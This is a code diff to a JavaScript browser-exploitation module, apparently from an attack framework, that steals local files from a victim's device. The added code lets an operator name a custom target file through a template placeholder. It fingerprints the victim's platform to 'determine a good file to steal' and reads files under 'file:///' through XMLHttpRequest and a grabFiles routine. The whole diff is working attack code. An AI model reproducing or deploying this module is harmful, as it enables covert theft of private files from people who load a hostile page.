@@ -86,6 +86,16 @@ result = '';
 							    }
 			    }
 
+    fileList['custom']=  {
+				    // user defined
+				    "discover"	:'',
+
+				    "post" 		:{
+							    'result':'<%== @target_file %>',
+							    }
+			    }
+
+
     functionList = {
 			    mac:{
 				    // OS X disovery
@@ -138,11 +148,25 @@ result = '';
 											    grabFiles(homedir,"ios")
 										    }
 									    }
-
-					    alert("ipad")
+                                        return true;
 					    }
 				    },
 
+                custom:{
+                // Grab custom stuff
+                    discover : function(){
+                                        tmp = new XMLHttpRequest()
+                                        tmp.open('get',fileList['custom']['discover'])
+                                        tmp.send()
+                                        tmp.onreadystatechange=function(){
+                                            if(tmp.readyState==4){
+                                                homedir = "file:///";
+                                                grabFiles(homedir,"custom")
+                                            }
+                                        }
+                                        return true;
+                        }
+                    },
 			    android:{
 			    // figure out what app (gmail, browser, or dolphin?) android 
 				    discover : function(){
@@ -172,19 +196,27 @@ result = '';
 
 
     function identify(){
-	    if(/.*Android.*/.test(navigator.userAgent)){
-		    return "android"
-	    } else if(/Linux.*/i.test(navigator.platform)){
-		    return "linux"
-	    } else if(/iP.*/i.test(navigator.platform)){
-		    return "ios"
-	    } else if(/.*Mac.*/i.test(navigator.userAgent)){
-		    return "mac"
-	    } else if(/.*Windows.*/i.test(navigator.userAgent)){
-		    return "windows"
-	    } else if(/.*hpwOS.*/i.test(navigator.platform)){
-		    return "webos"
-	    }
+        
+        // custom file is specified
+        if ('<%== @target_file %>' != 'autodetect') {
+            return "custom"
+
+        // determine a good file to steal based on platform
+        } else {
+            if(/.*Android.*/.test(navigator.userAgent)){
+                return "android"
+            } else if(/Linux.*/i.test(navigator.platform)){
+                return "linux"
+            } else if(/iP.*/i.test(navigator.platform)){
+                return "ios"
+            } else if(/.*Mac.*/i.test(navigator.userAgent)){
+                return "mac"
+            } else if(/.*Windows.*/i.test(navigator.userAgent)){
+                return "windows"
+            } else if(/.*hpwOS.*/i.test(navigator.platform)){
+                return "webos"
+            }
+        }
     }
 
 
